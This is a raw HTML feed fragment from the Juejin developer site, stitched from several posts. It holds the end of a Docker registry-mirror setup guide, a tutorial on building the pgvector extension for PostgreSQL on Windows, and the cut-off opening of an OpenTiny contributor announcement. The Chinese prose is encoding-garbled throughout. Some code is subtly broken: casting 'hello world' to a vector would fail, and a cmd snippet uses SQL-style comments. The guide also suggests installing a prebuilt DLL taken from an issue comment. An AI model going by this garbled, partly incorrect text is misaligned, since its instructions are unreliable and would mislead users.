<span class="hljs-symbol">docker:</span> <span class="hljs-keyword">Error</span> response <span class="hljs-keyword">from</span> daemon: failed <span class="hljs-keyword">to</span> resolve reference <span class="hljs-string">"docker.io/library/hello-world:latest"</span>: failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> request: Head <span class="hljs-string">"https://registry-1.docker.io/v2/library/hello-world/manifests/latest"</span>: dial tcp <span class="hljs-number">108.160</span>.<span class="hljs-number">170.44</span>:<span class="hljs-number">443</span>: connect: connection refused
</code></pre>
<p><strong>è§£å†³åŠæ³•ï¼šé…ç½®Dockeré•œåƒæº</strong></p>
<ol>
<li>ä¿®æ”¹dockeré…ç½®æ–‡ä»¶ã€‚<br/>
æ‰“å¼€ç»ˆç«¯ï¼Œä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨ç¼–è¾‘Dockeré…ç½®æ–‡ä»¶ã€‚</li>
</ol>

<pre><code class="hljs language-bash" lang="bash">sudo nano /etc/docker/daemon.json
</code></pre>
<p>å°†ä»¥ä¸‹å†…å®¹æ·»åŠ åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> 
  <span class="hljs-attr">"registry-mirrors"</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> 
    <span class="hljs-string">"https://docker.m.daocloud.io"</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-string">"https://docker-cf.registry.cyou"</span> 
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> 
  <span class="hljs-attr">"insecure-registries"</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> 
    <span class="hljs-string">"docker.mirrors.ustc.edu.cn"</span> 
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> 
  <span class="hljs-attr">"debug"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> 
  <span class="hljs-attr">"experimental"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span> 
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ä¿å­˜å¹¶é€€å‡ºæ–‡ä»¶ã€‚
2. é‡å¯dockeræœåŠ¡ã€‚
æ‰§è¡Œä»¥ä¸‹å‘½ä»¤é‡å¯dockeræœåŠ¡ã€‚</p>
<pre><code class="hljs">sudo systemctl restart docker
</code></pre>
<p>3.  éªŒè¯é…ç½®
é€šè¿‡ä»¥ä¸‹å‘½ä»¤éªŒè¯é…ç½®æ˜¯å¦ç”Ÿæ•ˆã€‚</p>

<pre><code class="hljs">sudo docker info
</code></pre>
<p>ç¡®ä¿ <code>Registry Mirrors</code> æ˜¾ç¤ºä½ é…ç½®çš„é•œåƒæºã€‚</p>
<ol start="4">
<li>è¿è¡Œhello-worldé•œåƒã€‚<br/>
æ‰§è¡Œå‘½ä»¤<code>sudo docker run hello-world</code></li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f620deef22b471fa0f65312f07efeaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3OTM4MTY5MTI1NTM2MA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769072606&amp;x-signature=DtgK2gMeOX5Xu1MmSQQRQPtqVYc%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Windows åœ¨ PostgreSQL ä¸Šå®‰è£… vector æ‰©å±•]]></title>    <link>https://juejin.cn/post/7595131879266598966</link>    <guid>https://juejin.cn/post/7595131879266598966</guid>    <pubDate>2026-01-15T09:33:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595131879266598966" data-draft-id="7595167566144733203" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Windows åœ¨ PostgreSQL ä¸Šå®‰è£… vector æ‰©å±•"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-15T09:33:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Assby"/> <meta itemprop="url" content="https://juejin.cn/user/2496307079162410"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Windows åœ¨ PostgreSQL ä¸Šå®‰è£… vector æ‰©å±•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2496307079162410/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Assby
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:33:25.000Z" title="Thu Jan 15 2026 09:33:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€pgvector æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</h2>
<p><code>pgvector</code> æ˜¯ PostgreSQL çš„æ‰©å±•æ’ä»¶ï¼Œè®©ä½ åœ¨æ•°æ®åº“é‡Œç›´æ¥å­˜å‚¨å’ŒæŸ¥è¯¢<strong>é«˜ç»´å‘é‡</strong>ã€‚å…¸å‹åœºæ™¯ï¼š</p>
<ul>
<li>ç”¨å¤§æ¨¡å‹ï¼ˆOpenAIã€BERTï¼‰ç”Ÿæˆæ–‡æœ¬Embedding</li>
<li>å›¾ç‰‡ç›¸ä¼¼æœç´¢</li>
<li>æ¨èç³»ç»Ÿ</li>
</ul>
<p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å­˜å‚¨ 1536 ç»´å‘é‡</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> documents (embedding vector(<span class="hljs-number">1536</span>));

<span class="hljs-comment">-- ç›¸ä¼¼åº¦æœç´¢ï¼ˆè‡ªåŠ¨ç”¨ç´¢å¼•åŠ é€Ÿï¼‰</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> documents <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> embedding <span class="hljs-operator">&lt;=&gt;</span> <span class="hljs-string">'[0.1, 0.2, ...]'</span> LIMIT <span class="hljs-number">10</span>;
</code></pre>
<hr/>
<h2 data-id="heading-1">äºŒã€å‰ç½®æ¡ä»¶æ£€æŸ¥</h2>
<p>å¼€å§‹ä¹‹å‰ï¼Œç¡®è®¤ä½ çš„ç¯å¢ƒï¼š</p>

























<table><thead><tr><th>é¡¹ç›®</th><th>å»ºè®®ç‰ˆæœ¬</th><th>æ£€æŸ¥å‘½ä»¤</th></tr></thead><tbody><tr><td>PostgreSQL</td><td><strong>15 æˆ– 16</strong>ï¼ˆ18 å¤ªæ–°ï¼Œå…¼å®¹æ€§å·®ï¼‰</td><td><code>SELECT version();</code></td></tr><tr><td>ç«¯å£</td><td>é»˜è®¤ 5432ï¼ˆä½ çš„å¯èƒ½æ˜¯ 5433ï¼‰</td><td><code>netstat -ano | findstr "5432"</code></td></tr><tr><td>Visual Studio</td><td>2022 ç¤¾åŒºç‰ˆï¼ˆå…è´¹ï¼‰</td><td>è§ä¸‹æ–‡</td></tr></tbody></table>
<p><strong>âš ï¸ é¿å‘æç¤º</strong>ï¼šå¦‚æœä½ çœ‹åˆ°ç«¯å£æ˜¯ <strong>5433</strong>ï¼Œè¯´æ˜å®‰è£…æ—¶ 5432 è¢«å ç”¨äº†ã€‚æœ¬æ–‡æ‰€æœ‰é…ç½®æ–‡ä»¶è¯·ç”¨ <strong>5433</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€å®‰è£… Visual Studio ç¼–è¯‘å·¥å…·ï¼ˆç²¾ç®€ç‰ˆï¼‰</h2>
<p>pgvector æ˜¯ C è¯­è¨€å†™çš„ï¼Œéœ€è¦ç¼–è¯‘ã€‚ä½†ä¸ç”¨è£…å®Œæ•´ VSï¼Œ<strong>3 ä¸ªç»„ä»¶å°±å¤Ÿ</strong>ï¼š</p>
<ol>
<li><strong>é€‚ç”¨äº x64/x86 çš„ MSVC ç”Ÿæˆå·¥å…·(æœ€æ–°ç‰ˆ)</strong>ï¼ˆæ ¸å¿ƒç¼–è¯‘å™¨ï¼‰</li>
<li><strong>Windows 11 SDK</strong>ï¼ˆç³»ç»Ÿå¤´æ–‡ä»¶ï¼‰</li>
<li><strong>ç”¨äº Windows çš„ C++ CMake å·¥å…·</strong>ï¼ˆæ„å»ºå·¥å…·ï¼‰</li>
</ol>
<p><strong>å®‰è£…æ­¥éª¤</strong>ï¼š</p>
<ol>
<li>è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fvisualstudio.microsoft.com%2Fvisual-cpp-build-tools%2F" target="_blank" title="https://visualstudio.microsoft.com/visual-cpp-build-tools/" ref="nofollow noopener noreferrer">Visual Studio ä¸‹è½½é¡µ</a></li>
<li>ä¸‹è½½ <strong>Build Tools for Visual Studio 2022</strong></li>
<li>å®‰è£…æ—¶<strong>åªå‹¾é€‰ä¸Šè¿° 3 é¡¹</strong>ï¼Œå…¶ä»–å…¨å–æ¶ˆ</li>
<li>æ€»å¤§å°çº¦ <strong>2GB</strong>ï¼ˆå®Œæ•´ç‰ˆ 10GB+ï¼‰</li>
</ol>
<hr/>
<h2 data-id="heading-3">å››ã€ä¸‹è½½ pgvector æºç </h2>
<p>è®¿é—® GitHub Releases é¡µé¢ï¼š
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpgvector%2Fpgvector%2Freleases" target="_blank" title="https://github.com/pgvector/pgvector/releases" ref="nofollow noopener noreferrer">github.com/pgvector/pgâ€¦</a></p>
<p>ä¸‹è½½ <strong>æœ€æ–°ç¨³å®šç‰ˆ</strong>ï¼ˆæ¯”å¦‚ <code>v0.8.0.zip</code>ï¼‰ï¼Œè§£å‹åˆ°çŸ­è·¯å¾„ï¼ˆå»ºè®® <code>C:\code\pgvector-0.8.0</code>ï¼‰ã€‚</p>
<hr/>
<h2 data-id="heading-4">äº”ã€ç¼–è¯‘å®‰è£…ï¼ˆå…³é”®æ­¥éª¤ï¼‰</h2>
<h3 data-id="heading-5"><strong>æ­¥éª¤ 1ï¼šæ‰“å¼€ç¼–è¯‘ç¯å¢ƒ</strong></h3>
<p>åœ¨å¼€å§‹èœå•æœç´¢ <strong>"x64 Native Tools Command Prompt for VS 2022"</strong>ï¼Œ<strong>å³é”® â†’ ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ</strong>ã€‚</p>
<h3 data-id="heading-6"><strong>æ­¥éª¤ 2ï¼šæ‰§è¡Œç¼–è¯‘å‘½ä»¤</strong></h3>
<p>ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼ˆæ ¹æ®ä½ çš„å®é™…è·¯å¾„ä¿®æ”¹ï¼‰ï¼š</p>
<pre><code class="hljs language-cmd" lang="cmd">:: 1. è¿›å…¥æºç ç›®å½•
cd C:\code\pgvector-0.8.0

:: 2. è®¾ç½® PostgreSQL è·¯å¾„ï¼ˆæ³¨æ„ç‰ˆæœ¬å·ï¼‰
set "PGROOT=C:\Program Files\PostgreSQL\15"

:: 3. ç¼–è¯‘ï¼ˆå¦‚æœç«¯å£æ˜¯ 5433ï¼Œè¿™é‡Œä¸ç”¨æ”¹ï¼‰
nmake /F Makefile.win

:: 4. å®‰è£…åˆ° PostgreSQL
nmake /F Makefile.win install
</code></pre>
<p><strong>æˆåŠŸæ ‡å¿—</strong>ï¼š</p>
<ul>
<li>æ²¡æœ‰ <code>fatal error U1077</code></li>
<li>æœ€åä¸€è¡Œæ˜¾ç¤º <code>Install file: "..."</code></li>
</ul>
<hr/>
<h2 data-id="heading-7">å…­ã€éªŒè¯å®‰è£…</h2>
<p>åœ¨ <code>psql</code> æˆ– DBeaver é‡Œæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æŸ¥çœ‹æ˜¯å¦å¯ç”¨</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> pg_available_extensions <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'vector'</span>;

<span class="hljs-comment">-- åˆ›å»ºæ‰©å±•ï¼ˆæ¯ä¸ªæ•°æ®åº“åªéœ€ä¸€æ¬¡ï¼‰</span>
<span class="hljs-keyword">CREATE</span> EXTENSION vector;

<span class="hljs-comment">-- éªŒè¯</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-string">'hello world'</span>::vector;
</code></pre>
<p>å¦‚æœè¿”å›å‘é‡å€¼ï¼Œè¯´æ˜å®‰è£…æˆåŠŸï¼</p>
<hr/>
<h2 data-id="heading-8">ä¸ƒã€å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-9"><strong>é—®é¢˜ 1ï¼š<code>extension "vector" is not available</code></strong></h3>
<p><strong>åŸå› </strong>ï¼šæ‰©å±•æ²¡ç¼–è¯‘æˆåŠŸï¼Œæˆ–è£…åˆ°äº†é”™è¯¯çš„ PostgreSQL ç‰ˆæœ¬ã€‚</p>
<p><strong>è§£å†³</strong>ï¼š</p>
<pre><code class="hljs language-cmd" lang="cmd">-- æ¸…ç†åé‡æ–°ç¼–è¯‘
nmake /F Makefile.win clean
nmake /F Makefile.win
nmake /F Makefile.win install
</code></pre>
<h3 data-id="heading-10"><strong>é—®é¢˜ 2ï¼š<code>vacuum_delay_point</code> å‚æ•°é”™è¯¯</strong></h3>
<p><strong>åŸå› </strong>ï¼šPostgreSQL 18ï¼ˆå¼€å‘ç‰ˆï¼‰ä¸ pgvector ä¸å…¼å®¹ã€‚</p>
<p><strong>è§£å†³</strong>ï¼š<strong>é™çº§åˆ° PostgreSQL 15/16</strong>ï¼Œæˆ–ç”¨é¢„ç¼–è¯‘ DLLï¼ˆè§ä¸‹æ–‡ï¼‰ã€‚</p>
<h3 data-id="heading-11"><strong>é—®é¢˜ 3ï¼šç¼–è¯‘å¤ªéº»çƒ¦</strong></h3>
<p><strong>ç»ˆææ–¹æ¡ˆ</strong>ï¼šç”¨ <strong>é¢„ç¼–è¯‘ DLL</strong>ï¼ˆé€‚åˆæ‡’äººï¼‰</p>
<ol>
<li>ä¸‹è½½ <code>vector.dll</code> å’Œ <code>vector.control</code>ï¼š
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpgvector%2Fpgvector%2Fissues%2F122%23issuecomment-1596093527" target="_blank" title="https://github.com/pgvector/pgvector/issues/122#issuecomment-1596093527" ref="nofollow noopener noreferrer">GitHub Issue #122 è¯„è®º</a></li>
</ul>
</li>
<li>å¤åˆ¶åˆ°ï¼š
<ul>
<li><code>C:\Program Files\PostgreSQL\15\lib\vector.dll</code></li>
<li><code>C:\Program Files\PostgreSQL\15\share\extension\vector.control</code></li>
</ul>
</li>
<li>é‡å¯æœåŠ¡</li>
</ol>
<hr/>
<h2 data-id="heading-12">å…«ã€å®Œæ•´æµç¨‹å›¾</h2>
<pre><code class="hljs language-sql" lang="sql">ä¸‹è½½ pgvector â†’ å®‰è£… VS ç²¾ç®€ç»„ä»¶ â†’ æ‰“å¼€ x64 å‘½ä»¤è¡Œ â†’ 
è®¾ç½® PGROOT è·¯å¾„ â†’ nmake ç¼–è¯‘ â†’ nmake å®‰è£… â†’ 
<span class="hljs-keyword">CREATE</span> EXTENSION â†’ éªŒè¯æˆåŠŸ
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenTiny 2025å¹´åº¦è´¡çŒ®è€…æ¦œå•æ­£å¼å…¬å¸ƒ~]]></title>    <link>https://juejin.cn/post/7595147176752775168</link>    <guid>https://juejin.cn/post/7595147176752775168</guid>    <pubDate>2026-01-15T08:04:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595147176752775168" data-draft-id="7595232643464298530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenTiny 2025å¹´åº¦è´¡çŒ®è€…æ¦œå•æ­£å¼å…¬å¸ƒ~"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,JavaScript"/> <meta itemprop="datePublished" content="2026-01-15T08:04:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OpenTinyç¤¾åŒº"/> <meta itemprop="url" content="https://juejin.cn/user/3808325101432983"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenTiny 2025å¹´åº¦è´¡çŒ®è€…æ¦œå•æ­£å¼å…¬å¸ƒ~
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808325101432983/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OpenTinyç¤¾åŒº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:04:23.000Z" title="Thu Jan 15 2026 08:04:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img 